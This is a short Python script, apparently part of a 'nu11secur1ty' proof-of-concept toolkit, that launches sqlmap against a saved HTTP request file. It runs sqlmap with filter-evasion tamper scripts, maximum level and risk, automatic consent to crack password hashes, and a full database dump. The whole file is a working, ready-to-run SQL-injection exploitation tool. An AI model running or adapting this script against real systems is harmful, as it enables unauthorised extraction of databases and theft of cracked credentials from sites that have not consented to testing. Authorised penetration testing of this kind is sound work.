#!/usr/bin/python
# nu11secur1ty 2023-2025

import time
import os
from colorama import init, Fore, Style

init(convert=True)

print("The PoC process will be continue...\n")
time.sleep(3)

print(Fore.GREEN + "Press Enter to continue...\n")
print(Style.RESET_ALL)

# Dynamically find the base folder (where this script is located, parent of modules/)
base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
exploit_path = os.path.join(base_dir, 'exploit.txt')

sqlmap_path = r'D:\CVE\sqlmap-nu11secur1ty\sqlmap.py'  # Adjust if needed

if not os.path.exists(exploit_path):
    print(Fore.RED + f"❌ Exploit file not found at {exploit_path}. Please generate it first.")
    exit(1)

cmd = f'python "{sqlmap_path}" -r "{exploit_path}" --tamper="space2comment,apostrophemask,bypass" --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
os.system(cmd)

print(Fore.RED + "Happy hunting with nu11secur1ty =)")
print(Style.RESET_ALL)
